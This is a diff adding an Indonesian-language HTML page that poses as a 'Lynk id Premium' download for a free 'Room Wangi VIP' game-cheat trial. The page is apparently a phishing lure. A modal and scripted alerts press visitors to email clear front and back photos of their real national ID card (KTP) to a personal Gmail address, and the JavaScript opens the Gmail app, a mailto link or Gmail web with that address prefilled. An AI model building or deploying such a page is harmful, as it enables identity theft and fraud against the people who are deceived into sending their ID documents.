@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lynk id Premium - Room Wangi VIP</title>
+    <style>
+        :root {
+            --bg-color: #0a0a0f;
+            --card-bg: #15151f;
+            --card-border: #2a2a3a;
+            --text-dark: #f0f0f5;
+            --text-muted: #8a8a9a;
+            --accent: #27ae60;
+            --accent-glow: rgba(39, 174, 96, 0.4);
+            --danger: #e74c3c;
+            --danger-glow: rgba(231, 76, 60, 0.3);
+        }
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            color: var(--text-dark);
+            padding-bottom: 100px;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        #particle-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .header, .container, .modal { position: relative; z-index: 1; }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            background: transparent;
+            font-weight: bold;
+            font-size: 20px;
+            text-shadow: 0 0 20px rgba(39, 174, 96, 0.3);
+        }
+        .header span { margin-left: 15px; }
+        .container { padding: 0 20px; max-width: 600px; margin: 0 auto; }
+
+        .product-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 60px rgba(39, 174, 96, 0.05);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .product-image {
+            width: 100%; height: auto;
+            display: block; object-fit: cover;
+            max-height: 400px;
+        }
+        .product-details { padding: 25px; }
+        .product-title {
+            font-size: 24px; font-weight: 800;
+            margin: 0 0 10px 0;
+            color: var(--text-dark);
+            text-shadow: 0 0 15px rgba(39, 174, 96, 0.4);
+        }
+        .product-price {
+            font-size: 28px; font-weight: bold;
+            color: var(--accent);
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px var(--accent-glow);
+        }
+        .product-desc {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        .feature-box {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        .feature-title {
+            font-weight: bold; font-size: 16px;
+            margin-bottom: 15px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--card-border);
+            padding-bottom: 10px;
+            text-shadow: 0 0 10px var(--accent-glow);
+        }
+        .feature-list { list-style: none; padding: 0; margin: 0; }
+        .feature-list li {
+            padding: 10px 0;
+            color: var(--text-dark);
+            display: flex; align-items: center;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+        }
+        .feature-list li:last-child { border-bottom: none; }
+        .feature-list li::before {
+            content: "✓";
+            color: var(--accent);
+            font-weight: bold;
+            margin-right: 15px;
+            font-size: 18px;
+            text-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .btn-download {
+            background: linear-gradient(135deg, #27ae60, #1e8449);
+            color: white; border: none;
+            padding: 18px 20px; border-radius: 12px;
+            font-size: 16px; font-weight: bold;
+            width: 100%; cursor: pointer;
+            margin-top: 10px; text-align: center;
+            box-shadow: 0 4px 25px var(--accent-glow);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-download:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 35px var(--accent-glow);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        .modal-content {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            padding: 25px; border-radius: 16px;
+            width: 100%; max-width: 440px;
+            max-height: 90vh; overflow-y: auto;
+            animation: slideUp 0.3s ease-out;
+            box-shadow: 0 0 60px rgba(0,0,0,0.8);
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .modal-title {
+            margin-top: 0; text-align: center;
+            color: var(--text-dark); font-size: 20px;
+        }
+
+        .warning-box {
+            background: rgba(231, 76, 60, 0.1);
+            border: 1px solid var(--danger);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0 20px 0;
+            font-size: 12.5px;
+            line-height: 1.6;
+            color: #ffb3aa;
+            box-shadow: 0 0 20px var(--danger-glow);
+        }
+        .warning-box strong {
+            color: #ff6b5b;
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .warning-box .cross { color: var(--danger); font-weight: bold; }
+
+        .step-box {
+            background: rgba(39, 174, 96, 0.08);
+            border: 1px solid var(--accent);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-size: 12.5px;
+            line-height: 1.7;
+            color: #b8ffd6;
+        }
+        .step-box strong {
+            color: var(--accent);
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-transform: uppercase;
+        }
+        .step-box ol { margin: 0; padding-left: 20px; }
+        .step-box ol li { margin-bottom: 6px; }
+
+        .email-preview {
+            background: #0d0d14;
+            border: 1px solid var(--card-border);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 12px 0;
+            font-size: 11.5px;
+            color: var(--text-muted);
+            line-height: 1.7;
+            word-break: break-word;
+        }
+        .email-preview .label {
+            color: var(--accent);
+            font-weight: bold;
+        }
+
+        .confirm-check {
+            display: flex; align-items: flex-start; gap: 10px;
+            margin-bottom: 18px; font-size: 12px;
+            color: #ffb3aa; line-height: 1.5;
+            background: rgba(231, 76, 60, 0.05);
+            border: 1px dashed var(--danger);
+            border-radius: 8px; padding: 12px;
+        }
+        .confirm-check input[type="checkbox"] {
+            margin-top: 3px;
+            width: 18px; height: 18px;
+            accent-color: var(--danger);
+            flex-shrink: 0; cursor: pointer;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white; border: none;
+            padding: 15px; width: 100%;
+            border-radius: 8px;
+            font-size: 15px; font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 20px var(--danger-glow);
+            transition: opacity 0.2s, transform 0.2s;
+        }
+        .submit-btn:disabled {
+            opacity: 0.4; cursor: not-allowed;
+            box-shadow: none; background: #2a2a3a;
+        }
+        .submit-btn:not(:disabled):hover { transform: translateY(-1px); }
+
+        .cancel-btn {
+            background: none; border: none;
+            color: var(--text-muted);
+            width: 100%; margin-top: 12px;
+            cursor: pointer; font-size: 14px; padding: 8px;
+        }
+        .cancel-btn:hover { color: var(--text-dark); }
+
+        .modal-content::-webkit-scrollbar { width: 6px; }
+        .modal-content::-webkit-scrollbar-track { background: transparent; }
+        .modal-content::-webkit-scrollbar-thumb { background: var(--card-border); border-radius: 3px; }
+    </style>
+</head>
+<body>
+
+    <canvas id="particle-canvas"></canvas>
+
+    <div class="header">
+        ← <span>Lynk id Premium</span>
+    </div>
+
+    <div class="container">
+        <div class="product-card">
+            <img src="https://i.supaimg.com/59d9dfb1-12b4-4be9-8e1d-0469c50b82d1/28c083b9-96e3-4c8f-9fd7-9b9f41cd51fd.jpg" alt="Room Wangi VIP Trial Free" class="product-image">
+            <div class="product-details">
+                <h1 class="product-title">Room Wangi VIP Trial</h1>
+                <div class="product-price">100% FREE</div>
+                <p class="product-desc">
+                    Dapatkan akses percobaan eksklusif (Trial) untuk Room Wangi VIP.
+                    Syarat dan ketentuan berlaku. Wajib verifikasi identitas sebelum mengunduh.
+                </p>
+            </div>
+        </div>
+
+        <div class="feature-box">
+            <div class="feature-title">Keuntungan Akses VIP:</div>
+            <ul class="feature-list">
+                <li>Bug Musuh Bot</li>
+                <li>Bot Rank/Classic</li>
+                <li>Unlimited Bot</li>
+                <li>Suntik KDA +99%</li>
+                <li>Work All Tier</li>
+                <li>Support All Device</li>
+            </ul>
+        </div>
+
+        <button id="btnDownloadRoom" class="btn-download">Download Room Wangi VIP</button>
+    </div>
+
+    <!-- Modal Peringatan -->
+    <div class="modal" id="registerModal">
+        <div class="modal-content">
+            <h3 class="modal-title">⚠ Peringatan Sebelum Kirim</h3>
+
+            <div class="warning-box">
+                <strong>⚠ PERINGATAN WAJIB KTP ⚠</strong>
+                Sebelum mengirim gambar, pastikan Anda membaca ketentuan berikut:
+                <br><br>
+                ✅ <strong>KTP FOTO DEPAN & BELAKANG</strong> wajib sangat jelas, tidak buram, tidak terpotong.
+                <br>
+                <span class="cross">✖</span> <strong>TIDAK EDITAN</strong> — KTP yang diedit / diubah akan langsung <strong>DITOLAK</strong>.
+                <br>
+                <span class="cross">✖</span> <strong>KTP PALSU</strong> — Otomatis <strong>DITOLAK</strong> & akun diblokir permanen.
+                <br><br>
+                🛡 <strong>WAJIB KTP ASLI</strong> milik sendiri, bukan milik orang lain.
+            </div>
+
+            <div class="step-box">
+                <strong>📨 LANGKAH SETELAH KLIK TOMBOL:</strong>
+                <ol>
+                    <li><strong>APLIKASI GMAIL langsung terbuka</strong> (bukan browser).</li>
+                    <li>Klik ikon <strong>📎 Lampiran</strong> di Gmail.</li>
+                    <li>Pilih <strong>2 foto</strong>: KTP <strong>DEPAN</strong> & <strong>BELAKANG</strong>.</li>
+                    <li>Tekan tombol <strong>KIRIM</strong> ✉️ di Gmail.</li>
+                </ol>
+            </div>
+
+            <div class="email-preview">
+                <div><span class="label">📧 Tujuan:</span> ajistoreid1@gmail.com</div>
+                <div><span class="label">📎 Lampiran Wajib:</span> 2 foto (KTP Depan + KTP Belakang)</div>
+                <div><span class="label">📱 Mode:</span> Aplikasi Gmail langsung terbuka</div>
+            </div>
+
+            <label class="confirm-check">
+                <input type="checkbox" id="confirmWarning">
+                <span>Saya menyatakan KTP yang saya kirim adalah <strong>ASLI</strong>, <strong>JELAS</strong>, <strong>TIDAK DIEDIT</strong>, dan bukan <strong>KTP PALSU</strong>. Saya akan melampirkan <strong>2 foto (Depan & Belakang)</strong> di Gmail.</span>
+            </label>
+
+            <button type="button" class="submit-btn" id="btnSubmit" disabled>📧 Buka Aplikasi Gmail & Kirim KTP</button>
+            <button type="button" class="cancel-btn" onclick="closeModal()">Batal</button>
+        </div>
+    </div>
+
+    <script>
+        /* ============================================
+           PARTICLE BACKGROUND
+        ============================================ */
+        (function() {
+            const canvas = document.getElementById('particle-canvas');
+            const ctx = canvas.getContext('2d');
+            let width = canvas.width = window.innerWidth;
+            let height = canvas.height = window.innerHeight;
+
+            const particles = [];
+            const particleCount = Math.min(80, Math.floor(width * height / 15000));
+
+            const colors = [
+                'rgba(39, 174, 96, 0.8)',
+                'rgba(39, 174, 96, 0.5)',
+                'rgba(80, 220, 140, 0.6)',
+                'rgba(255, 255, 255, 0.35)',
+                'rgba(100, 200, 150, 0.4)'
+            ];
+
+            class Particle {
+                constructor() { this.reset(); }
+                reset() {
+                    this.x = Math.random() * width;
+                    this.y = Math.random() * height;
+                    this.size = Math.random() * 2 + 0.5;
+                    this.speedX = (Math.random() - 0.5) * 0.6;
+                    this.speedY = (Math.random() - 0.5) * 0.6;
+                    this.color = colors[Math.floor(Math.random() * colors.length)];
+                    this.alpha = Math.random() * 0.5 + 0.3;
+                    this.pulse = Math.random() * 0.02 + 0.005;
+                    this.pulseDir = 1;
+                }
+                update() {
+                    this.x += this.speedX;
+                    this.y += this.speedY;
+                    this.alpha += this.pulse * this.pulseDir;
+                    if (this.alpha >= 0.9) this.pulseDir = -1;
+                    if (this.alpha <= 0.2) this.pulseDir = 1;
+                    if (this.x < -10) this.x = width + 10;
+                    if (this.x > width + 10) this.x = -10;
+                    if (this.y < -10) this.y = height + 10;
+                    if (this.y > height + 10) this.y = -10;
+                }
+                draw() {
+                    ctx.save();
+                    ctx.globalAlpha = this.alpha;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    ctx.fillStyle = this.color;
+                    ctx.shadowBlur = 12;
+                    ctx.shadowColor = this.color;
+                    ctx.fill();
+                    ctx.restore();
+                }
+            }
+
+            for (let i = 0; i < particleCount; i++) particles.push(new Particle());
+
+            function connectParticles() {
+                for (let i = 0; i < particles.length; i++) {
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const dx = particles[i].x - particles[j].x;
+                        const dy = particles[i].y - particles[j].y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < 130) {
+                            ctx.save();
+                            ctx.globalAlpha = (1 - dist / 130) * 0.15;
+                            ctx.strokeStyle = 'rgba(39, 174, 96, 0.6)';
+                            ctx.lineWidth = 0.6;
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.stroke();
+                            ctx.restore();
+                        }
+                    }
+                }
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, width, height);
+                particles.forEach(p => { p.update(); p.draw(); });
+                connectParticles();
+                requestAnimationFrame(animate);
+            }
+            animate();
+
+            window.addEventListener('resize', () => {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            });
+        })();
+
+        /* ============================================
+           LOGIKA: LANGSUNG BUKA APLIKASI GMAIL
+        ============================================ */
+        const modal = document.getElementById('registerModal');
+        const btnDownload = document.getElementById('btnDownloadRoom');
+        const confirmWarning = document.getElementById('confirmWarning');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        const EMAIL_TUJUAN = "ajistoreid1@gmail.com";
+        const SUBJECT = "Verifikasi KTP - Room Wangi VIP Trial";
+        const BODY =
+            "Halo Admin Lynk id Premium,\n\n" +
+            "Saya ingin mengunduh Room Wangi VIP Trial.\n\n" +
+            "PERNYATAAN:\n" +
+            "Saya menyatakan bahwa KTP yang saya lampirkan adalah ASLI, JELAS, TIDAK DIEDIT, dan bukan KTP PALSU.\n\n" +
+            "LAMPIRAN WAJIB (2 FOTO):\n" +
+            "1. Foto KTP DEPAN\n" +
+            "2. Foto KTP BELAKANG\n\n" +
+            "Mohon verifikasi. Terima kasih.";
+
+        btnDownload.addEventListener('click', () => {
+            modal.style.display = 'flex';
+        });
+
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+
+        confirmWarning.addEventListener('change', () => {
+            btnSubmit.disabled = !confirmWarning.checked;
+        });
+
+        btnSubmit.addEventListener('click', () => {
+            if (!confirmWarning.checked) {
+                alert("⚠ Anda WAJIB menyetujui pernyataan sebelum melanjutkan!");
+                return;
+            }
+
+            const konfirmasi = confirm(
+                "⚠ PERINGATAN AKHIR ⚠\n\n" +
+                "Aplikasi Gmail akan terbuka otomatis.\n\n" +
+                "JANGAN LUPA:\n" +
+                "1️⃣ Lampirkan 2 FOTO KTP (Depan & Belakang)\n" +
+                "2️⃣ KTP harus ASLI, JELAS, TIDAK EDITAN\n" +
+                "3️⃣ Tekan tombol KIRIM di Gmail\n\n" +
+                "Jika KTP palsu / diedit → DITOLAK!\n\n" +
+                "Buka Gmail sekarang?"
+            );
+
+            if (!konfirmasi) return;
+
+            const subjectEncoded = encodeURIComponent(SUBJECT);
+            const bodyEncoded = encodeURIComponent(BODY);
+            const toEncoded = encodeURIComponent(EMAIL_TUJUAN);
+
+            // URL langsung ke APLIKASI Gmail (bukan browser)
+            // googlegmail:// → buka app Gmail di Android & iOS
+            const gmailAppUrl = `googlegmail://co?to=${toEncoded}&subject=${subjectEncoded}&body=${bodyEncoded}`;
+
+            // Fallback jika app Gmail tidak terinstall:
+            // 1. mailto → buka app email default
+            // 2. Gmail web
+            const mailtoUrl = `mailto:${EMAIL_TUJUAN}?subject=${subjectEncoded}&body=${bodyEncoded}`;
+            const gmailWebUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${toEncoded}&su=${subjectEncoded}&body=${bodyEncoded}`;
+
+            let appOpened = false;
+
+            // Deteksi apakah app Gmail berhasil terbuka
+            const startTime = Date.now();
+
+            // Coba buka app Gmail
+            window.location.href = gmailAppUrl;
+
+            // Cek setelah delay — jika app tidak terbuka, fallback
+            setTimeout(() => {
+                // Jika halaman masih fokus (app tidak terbuka) → fallback
+                if (!document.hidden && (Date.now() - startTime) < 2500) {
+                    // Coba mailto dulu (buka app email default)
+                    window.location.href = mailtoUrl;
+
+                    // Fallback terakhir ke Gmail web
+                    setTimeout(() => {
+                        if (!document.hidden) {
+                            window.location.href = gmailWebUrl;
+                        }
+                    }, 1200);
+                }
+            }, 1500);
+
+            // Tutup modal & reset
+            modal.style.display = 'none';
+            confirmWarning.checked = false;
+            btnSubmit.disabled = true;
+
+            // Instruksi setelah Gmail terbuka
+            setTimeout(() => {
+                alert(
+                    "📧 GMAIL SUDAH TERBUKA!\n\n" +
+                    "LANGKAH SELANJUTNYA:\n" +
+                    "1. Klik ikon 📎 (Lampiran/Paperclip)\n" +
+                    "2. Pilih FOTO KTP DEPAN\n" +
+                    "3. Klik 📎 lagi → pilih FOTO KTP BELAKANG\n" +
+                    "4. Pastikan 2 foto sudah terlampir\n" +
+                    "5. Tekan tombol KIRIM ✉️\n\n" +
+                    "⚠ Tanpa 2 foto KTP, permintaan akan DITOLAK!"
+                );
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
